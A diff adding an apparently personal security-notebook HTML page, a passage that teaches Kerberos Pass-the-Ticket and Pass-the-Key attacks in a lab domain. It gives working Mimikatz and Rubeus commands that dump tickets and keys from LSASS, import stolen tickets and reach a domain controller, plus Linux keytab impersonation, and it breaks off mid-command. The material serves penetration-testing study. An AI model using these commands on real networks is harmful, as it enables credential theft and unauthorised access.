@@ -1,0 +1,807 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Pass the Ticket - notebook</title>
+
+
+        <!-- Custom HTML head -->
+        <link rel="icon" href="theme/logo.png">
+        
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon-de23e50b.svg">
+        <link rel="shortcut icon" href="../../favicon-8114d1fc.png">
+        <link rel="stylesheet" href="../../css/variables-8adf115d.css">
+        <link rel="stylesheet" href="../../css/general-2459343d.css">
+        <link rel="stylesheet" href="../../css/chrome-9dfbd86b.css">
+        <link rel="stylesheet" href="../../css/print-9e4910d8.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../fonts/fonts-9644e21d.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="mdbook-highlight-css" href="../../highlight-493f70e1.css">
+        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="../../tomorrow-night-4c0ae647.css">
+        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="../../ayu-highlight-3fdfc3ac.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../theme/custom-e80eafda.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../searchindex-45f66119.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc-9a594cb9.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="mdbook-body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="mdbook-page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <a href="https://rnemeth90.github.io" class="back-to-blog">
+                    🏠 Back to Blog
+                </a>
+                
+                <div id="mdbook-menu-bar-hover-placeholder"></div>
+                <div id="mdbook-menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
+                        </label>
+                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
+                        </button>
+                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
+                        </ul>
+                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">notebook</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="mdbook-search-wrapper" class="hidden">
+                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
+                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
+                        <ul id="mdbook-searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="mdbook-content" class="content">
+                    <main>
+                        <h1 id="pass-the-ticket-ptt-attacks"><a class="header" href="#pass-the-ticket-ptt-attacks">Pass the Ticket (PtT) Attacks</a></h1>
+<p>A Pass the Ticket (PtT) attack uses a stolen Kerberos ticket to move laterally in an Active Directory environment instead of an NTLM password hash. This technique leverages the Kerberos authentication protocol to access resources without needing the user’s plaintext password.</p>
+<h2 id="kerberos-protocol-overview"><a class="header" href="#kerberos-protocol-overview">Kerberos Protocol Overview</a></h2>
+<p>The Kerberos authentication system is ticket-based. Instead of giving an account password to every service, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service.</p>
+<h3 id="key-components"><a class="header" href="#key-components">Key Components</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Component</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>TGT</strong> (Ticket Granting Ticket)</td><td>First ticket obtained on a Kerberos system. Permits the client to obtain additional Kerberos tickets (TGS).</td></tr>
+<tr><td><strong>TGS</strong> (Ticket Granting Service)</td><td>Requested by users who want to use a service. Allows services to verify the user’s identity.</td></tr>
+<tr><td><strong>KDC</strong> (Key Distribution Center)</td><td>Issues tickets to clients. Usually runs on the Domain Controller.</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="authentication-flow"><a class="header" href="#authentication-flow">Authentication Flow</a></h3>
+<ol>
+<li>User requests a TGT by authenticating to the DC (encrypting current timestamp with their password hash)</li>
+<li>DC validates the user’s identity by decrypting the timestamp (DC knows the user’s password hash)</li>
+<li>DC sends the user a TGT for future requests</li>
+<li>User presents TGT to request TGS for specific services</li>
+<li>User presents TGS to the target service for authentication</li>
+</ol>
+<p>Once the user has their TGT, they do not have to prove who they are with their password again.</p>
+<hr>
+<h2 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h2>
+<p>To perform a Pass the Ticket attack, you need a valid Kerberos ticket:</p>
+<ul>
+<li><strong>Service Ticket (TGS)</strong> - Allows access to a particular resource</li>
+<li><strong>Ticket Granting Ticket (TGT)</strong> - Can be used to request service tickets for any resource the user has privileges to access</li>
+</ul>
+<p>Tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. As a non-administrative user, you can only get your own tickets. As a local administrator, you can collect all tickets on the system.</p>
+<hr>
+<h2 id="harvesting-kerberos-tickets"><a class="header" href="#harvesting-kerberos-tickets">Harvesting Kerberos Tickets</a></h2>
+<h3 id="using-mimikatz"><a class="header" href="#using-mimikatz">Using Mimikatz</a></h3>
+<p>Export all tickets from the system:</p>
+<pre><code class="language-cmd">c:\tools&gt; mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::tickets /export
+
+Authentication Id : 0 ; 329278 (00000000:0005063e)
+Session           : Network from 0
+User Name         : DC01$
+Domain            : HTB
+Logon Server      : (null)
+Logon Time        : 7/12/2022 9:39:55 AM
+SID               : S-1-5-18
+
+         * Username : DC01$
+         * Domain   : inlanefreight.htb
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+         [00000000]
+           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
+           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
+           Target Name  (--) : @ inlanefreight.htb
+           Client Name  (01) : DC01$ ; @ inlanefreight.htb
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
+           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !
+
+        Group 2 - Ticket Granting Ticket
+</code></pre>
+<p>The result is a list of <code>.kirbi</code> files containing the tickets.</p>
+<p><strong>Ticket Naming Convention:</strong></p>
+<ul>
+<li>Tickets ending with <code>$</code> correspond to computer accounts</li>
+<li>User tickets: <code>[randomvalue]-username@service-domain.local.kirbi</code></li>
+<li>Tickets with service <code>krbtgt</code> correspond to the TGT for that account</li>
+</ul>
+<h3 id="using-rubeus"><a class="header" href="#using-rubeus">Using Rubeus</a></h3>
+<p>Export tickets in Base64 format (use <code>/nowrap</code> for easier copy-paste):</p>
+<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe dump /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Current LUID    : 0x6c680
+    ServiceName           :  krbtgt/inlanefreight.htb
+    ServiceRealm          :  inlanefreight.htb
+    UserName              :  DC01$
+    UserRealm             :  inlanefreight.htb
+    StartTime             :  7/12/2022 9:39:54 AM
+    EndTime               :  7/12/2022 7:39:54 PM
+    RenewTill             :  7/19/2022 9:39:54 AM
+    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    KeyType               :  aes256_cts_hmac_sha1
+    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
+    Base64EncodedTicket   :  doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lh...
+</code></pre>
+<p><strong>Note:</strong> Mimikatz version 2.2.0 20220919 may show all hashes as <code>des_cbc_md4</code> on some Windows 10 versions. Exported tickets may not work correctly. Use Rubeus as an alternative.</p>
+<hr>
+<h2 id="pass-the-key--overpass-the-hash"><a class="header" href="#pass-the-key--overpass-the-hash">Pass the Key / OverPass the Hash</a></h2>
+<p>This technique converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full TGT.</p>
+<h3 id="extract-kerberos-keys-with-mimikatz"><a class="header" href="#extract-kerberos-keys-with-mimikatz">Extract Kerberos Keys with Mimikatz</a></h3>
+<pre><code class="language-cmd">c:\tools&gt; mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::ekeys
+
+Authentication Id : 0 ; 444066 (00000000:0006c6a2)
+Session           : Interactive from 1
+User Name         : plaintext
+Domain            : HTB
+Logon Server      : DC01
+Logon Time        : 7/12/2022 9:42:15 AM
+SID               : S-1-5-21-228825152-3134732153-3833540767-1107
+
+         * Username : plaintext
+         * Domain   : inlanefreight.htb
+         * Password : (null)
+         * Key List :
+           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
+           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
+</code></pre>
+<h3 id="mimikatz---pass-the-key"><a class="header" href="#mimikatz---pass-the-key">Mimikatz - Pass the Key</a></h3>
+<p>Using NTLM hash (RC4):</p>
+<pre><code class="language-cmd">mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+
+user    : plaintext
+domain  : inlanefreight.htb
+program : cmd.exe
+impers. : no
+NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
+  |  PID  1128
+  |  TID  3268
+  |  LSA Process is now R/W
+  |  LUID 0 ; 3414364 (00000000:0034195c)
+  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
+  \_ kerberos - data copy @ 000001C7E20EE578
+   \_ rc4_hmac_nt       OK
+   \_ *Password replace @ 000001C7E2136BC8 (32) -&gt; null
+</code></pre>
+<p>This spawns a new cmd.exe window in the context of the target user.</p>
+<h3 id="rubeus---pass-the-key-asktgt"><a class="header" href="#rubeus---pass-the-key-asktgt">Rubeus - Pass the Key (asktgt)</a></h3>
+<p>Using AES-256 hash:</p>
+<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
+[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
+[*] Using domain controller: 10.129.203.120:88
+[+] TGT request successful!
+[*] Base64(ticket.kirbi):
+
+      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC...
+
+[+] Ticket successfully imported!
+</code></pre>
+<hr>
+<h2 id="pass-the-ticket"><a class="header" href="#pass-the-ticket">Pass the Ticket</a></h2>
+<h3 id="rubeus---import-kirbi-file"><a class="header" href="#rubeus---import-kirbi-file">Rubeus - Import .kirbi File</a></h3>
+<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+[*] Action: Import Ticket
+[+] ticket successfully imported!
+
+c:\tools&gt; dir \\DC01.inlanefreight.htb\c$
+Directory: \\dc01.inlanefreight.htb\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2022  11:17 AM                Program Files
+d-----         6/4/2022  11:17 AM                Program Files (x86)
+...
+</code></pre>
+<h3 id="rubeus---import-base64-ticket"><a class="header" href="#rubeus---import-base64-ticket">Rubeus - Import Base64 Ticket</a></h3>
+<p>Convert .kirbi to Base64:</p>
+<pre><code class="language-powershell">PS c:\tools&gt; [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+
+doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQ...
+</code></pre>
+<p>Import Base64 ticket:</p>
+<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe ptt /ticket:doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQ...
+
+[+] Ticket successfully imported!
+</code></pre>
+<h3 id="mimikatz---pass-the-ticket"><a class="header" href="#mimikatz---pass-the-ticket">Mimikatz - Pass the Ticket</a></h3>
+<pre><code class="language-cmd">mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
+
+mimikatz # exit
+Bye!
+
+c:\tools&gt; powershell
+PS C:\tools&gt; Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents&gt; whoami
+inlanefreight\john
+</code></pre>
+<hr>
+<h2 id="rubeus---sacrificial-process-for-lateral-movement"><a class="header" href="#rubeus---sacrificial-process-for-lateral-movement">Rubeus - Sacrificial Process for Lateral Movement</a></h2>
+<p>Using <code>createnetonly</code> creates a sacrificial process/logon session (Logon type 9), equivalent to <code>runas /netonly</code>. This prevents erasure of existing TGTs for the current logon session.</p>
+<h3 id="create-sacrificial-process"><a class="header" href="#create-sacrificial-process">Create Sacrificial Process</a></h3>
+<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+
+[*] Action: Create process (/netonly)
+
+[*] Using random username and password.
+
+[*] Showing process : True
+[*] Username        : JMI8CL7C
+[*] Domain          : DTCDV6VL
+[*] Password        : MRWI6XGI
+[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 1556
+[+] LUID            : 0xe07648
+</code></pre>
+<h3 id="request-tgt-and-import-in-sacrificial-process"><a class="header" href="#request-tgt-and-import-in-sacrificial-process">Request TGT and Import in Sacrificial Process</a></h3>
+<p>From the new cmd window:</p>
+<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+
+[+] TGT request successful!
+[+] Ticket successfully imported!
+
+C:\tools&gt; powershell
+PS C:\tools&gt; Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents&gt; whoami
+inlanefreight\john
+[DC01]: PS C:\Users\john\Documents&gt; hostname
+DC01
+</code></pre>
+<hr>
+<h2 id="summary-of-key-commands"><a class="header" href="#summary-of-key-commands">Summary of Key Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>Mimikatz</td><td><code>sekurlsa::tickets /export</code></td><td>Export all tickets to .kirbi files</td></tr>
+<tr><td>Mimikatz</td><td><code>sekurlsa::ekeys</code></td><td>Extract Kerberos encryption keys</td></tr>
+<tr><td>Mimikatz</td><td><code>kerberos::ptt &lt;file.kirbi&gt;</code></td><td>Import ticket into current session</td></tr>
+<tr><td>Rubeus</td><td><code>dump /nowrap</code></td><td>Dump all tickets in Base64</td></tr>
+<tr><td>Rubeus</td><td><code>asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;hash&gt; /ptt</code></td><td>Request TGT with hash and import</td></tr>
+<tr><td>Rubeus</td><td><code>ptt /ticket:&lt;file or base64&gt;</code></td><td>Import ticket into current session</td></tr>
+<tr><td>Rubeus</td><td><code>createnetonly /program:cmd.exe /show</code></td><td>Create sacrificial logon session</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="pass-the-ticket-from-linux"><a class="header" href="#pass-the-ticket-from-linux">Pass the Ticket from Linux</a></h2>
+<p>Linux computers connected to Active Directory commonly use Kerberos for authentication. If you compromise a Linux machine connected to AD, you can find Kerberos tickets to impersonate other users.</p>
+<p><strong>Note:</strong> A Linux machine doesn’t need to be domain-joined to use Kerberos tickets. Scripts and applications can use Kerberos to authenticate to the network.</p>
+<h3 id="kerberos-ticket-storage-on-linux"><a class="header" href="#kerberos-ticket-storage-on-linux">Kerberos Ticket Storage on Linux</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Storage Type</th><th>Location</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>ccache files</strong></td><td><code>/tmp/krb5cc_*</code></td><td>Default ticket cache files, location stored in <code>KRB5CCNAME</code> environment variable</td></tr>
+<tr><td><strong>Keytab files</strong></td><td><code>/etc/krb5.keytab</code> or custom</td><td>Contains Kerberos principals and encrypted keys for passwordless authentication</td></tr>
+<tr><td><strong>SSSD cache</strong></td><td><code>/var/lib/sss/db/</code></td><td>Used by SSSD for caching credentials</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="identifying-ad-integration"><a class="header" href="#identifying-ad-integration">Identifying AD Integration</a></h3>
+<p>Check if the Linux machine is domain-joined:</p>
+<pre><code class="language-bash"># Using realm
+david@linux01:~$ realm list
+
+inlanefreight.htb
+  type: kerberos
+  realm-name: INLANEFREIGHT.HTB
+  domain-name: inlanefreight.htb
+  configured: kerberos-member
+  server-software: active-directory
+  client-software: sssd
+  required-package: sssd-tools
+  required-package: sssd
+  login-formats: %U@inlanefreight.htb
+  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
+  permitted-groups: Linux Admins
+</code></pre>
+<p>Check for SSSD or Winbind services:</p>
+<pre><code class="language-bash">david@linux01:~$ ps -ef | grep -i "winbind\|sssd"
+
+root  2140  1  0 Sep29 ?  00:00:01 /usr/sbin/sssd -i --logger=files
+root  2141  2140  0 Sep29 ?  00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
+root  2142  2140  0 Sep29 ?  00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
+root  2143  2140  0 Sep29 ?  00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
+</code></pre>
+<hr>
+<h3 id="finding-keytab-files"><a class="header" href="#finding-keytab-files">Finding Keytab Files</a></h3>
+<p>Search for keytab files:</p>
+<pre><code class="language-bash">david@linux01:~$ find / -name *keytab* -ls 2&gt;/dev/null
+
+131610  4 -rw-------  1 root  root  1348 Oct  4 16:26 /etc/krb5.keytab
+262169  4 -rw-rw-rw-  1 root  root   216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
+</code></pre>
+<p>Check for keytab references in cron jobs:</p>
+<pre><code class="language-bash">david@linux01:~$ crontab -l
+
+# Ticket renewal
+kinit -k -t /home/carlos@inlanefreight.htb/.scripts/kerberos/.]carlos.keytab carlos@inlanefreight.htb
+</code></pre>
+<h3 id="listing-keytab-file-principals"><a class="header" href="#listing-keytab-file-principals">Listing Keytab File Principals</a></h3>
+<pre><code class="language-bash">david@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab
+
+Keytab name: FILE:/opt/specialfiles/carlos.keytab
+KVNO Timestamp           Principal
+---- ------------------- ------------------------------------------------------
+   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
+</code></pre>
+<h3 id="impersonating-a-user-with-keytab"><a class="header" href="#impersonating-a-user-with-keytab">Impersonating a User with Keytab</a></h3>
+<pre><code class="language-bash"># Check current ticket
+david@linux01:~$ klist
+
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: david@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+
+# Import keytab (kinit is case-sensitive!)
+david@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+
+# Verify new ticket
+david@linux01:~$ klist
+
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: carlos@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+</code></pre>
+<p>Access resources as the impersonated user:</p>
+<pre><code class="language-bash">david@linux01:~$ smbclient //dc01/carlos -k -c ls
